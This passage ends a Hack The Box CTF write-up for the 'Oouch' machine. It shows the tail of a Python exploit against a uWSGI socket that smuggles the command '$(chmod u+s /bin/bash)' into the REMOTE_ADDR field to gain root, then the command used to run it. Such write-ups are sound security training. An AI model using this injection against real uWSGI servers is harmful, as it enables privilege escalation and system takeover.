        <span class="s">'PATH_INFO'</span><span class="p">:</span> <span class="n">path</span><span class="p">,</span>
        <span class="s">'HTTP_HOST'</span><span class="p">:</span> <span class="s">'consumer.oouch.htb'</span><span class="p">,</span>
        <span class="s">'REQUEST_METHOD'</span><span class="p">:</span> <span class="s">'POST'</span><span class="p">,</span>
        <span class="s">'HTTP_COOKIE'</span><span class="p">:</span> <span class="s">'session=.eJy9kb9OAzEMxl8lzcJSIV_-p0-BYGCAqnIcpz1xvUNNKoaq706AEbEggRfbsn_6_MkXuSsT1gNXuXm6SNF6kkeuFfcs1_JuYqwspmUvxlm0RSBRH4p2GKt47Tu3cntdf-fueT_WdsI2LrN4OH9C5TytxCNPtBxZ1Hl5q4Tz6pf8jWD6Ldu4NvEsf8D_zHJa0n9L4jQSf4hu1_3PJ64HuSk4Ve7tmOVGGkiKoh4yhaJ7qKjAQ7A-MJG2jqwyBDbZHC0mg4N22igXSibkpDNYn4pz5CK5HpGyRQs2AKUSjbOANCQXQoy-AID3JRVIznkXiy3edBNUT2XXlhee-z3Bp6AGg8YMrNByr61JNiqdNAVUBBqGDLlz58qnLxODvL4Dkk_jDQ.XlvGhA.DK61IKezdy9GLX14VLDcSgPviD4'</span><span class="p">,</span>
        <span class="s">'QUERY_STRING'</span><span class="p">:</span> <span class="s">''</span><span class="p">,</span>
        <span class="s">'CONTENT_LENGTH'</span><span class="p">:</span> <span class="mi">130</span><span class="p">,</span>
        <span class="s">'REMOTE_ADDR'</span><span class="p">:</span> <span class="s">'$(chmod u+s /bin/bash)'</span><span class="p">,</span>
        <span class="s">'CONTENT_TYPE'</span><span class="p">:</span> <span class="s">'application/x-www-form-urlencoded'</span>
    <span class="p">}.</span><span class="n">items</span><span class="p">())</span>
    <span class="n">dump_from_socket</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
    <span class="n">s</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="n">ap</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="n">ArgumentParser</span><span class="p">()</span>
    <span class="n">ap</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'--host'</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="s">'localhost'</span><span class="p">)</span>
    <span class="n">ap</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'--port'</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="nb">int</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="mi">9090</span><span class="p">)</span>
    <span class="n">ap</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'path'</span><span class="p">)</span>
    <span class="n">args</span> <span class="o">=</span> <span class="n">ap</span><span class="p">.</span><span class="n">parse_args</span><span class="p">()</span>
    <span class="n">talk_to_uwsgi</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="n">args</span><span class="p">.</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="n">args</span><span class="p">.</span><span class="n">port</span><span class="p">,</span> <span class="n">path</span><span class="o">=</span><span class="n">args</span><span class="p">.</span><span class="n">path</span><span class="p">)</span>


<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>
</code></pre></div></div>

<p>After executing the exploit, we can run <code class="language-plaintext highlighter-rouge">/bin/bash</code> as root and get the final flag.</p>

<p><code class="language-plaintext highlighter-rouge">qtc@aeb4525789d8:/tmp$ python /tmp/exploit.py /contact</code></p>

<p><img src="/assets/images/htb-writeup-oouch/Screenshot_39.png" alt="" /></p>

<p><img src="/assets/images/htb-writeup-oouch/Screenshot_40.png" alt="" /></p>

        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#api" class="page__taxonomy-item" rel="tag">api</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#dbus" class="page__taxonomy-item" rel="tag">dbus</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#flask" class="page__taxonomy-item" rel="tag">flask</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#ftp" class="page__taxonomy-item" rel="tag">ftp</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#linux" class="page__taxonomy-item" rel="tag">linux</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#oauth" class="page__taxonomy-item" rel="tag">oauth</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#python" class="page__taxonomy-item" rel="tag">python</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#uwsgi" class="page__taxonomy-item" rel="tag">uwsgi</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#xss" class="page__taxonomy-item" rel="tag">xss</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#hackthebox" class="page__taxonomy-item" rel="tag">hackthebox</a><span class="sep">, </span>
    
      
      
      <a href="/categories/#infosec" class="page__taxonomy-item" rel="tag">infosec</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2020-08-01T00:00:00+02:00">August 01, 2020</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="/htb-writeup-cascade/" class="pagination--pager" title="Cascade - Hack The Box
">Previous</a>
    
    
      <a href="/htb-writeup-traceback/" class="pagination--pager" title="Traceback - Hack The Box
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
</div>

    </div>

    

    <div class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    

    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">&copy; 2022 HackCommander</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>








  </body>
</html>
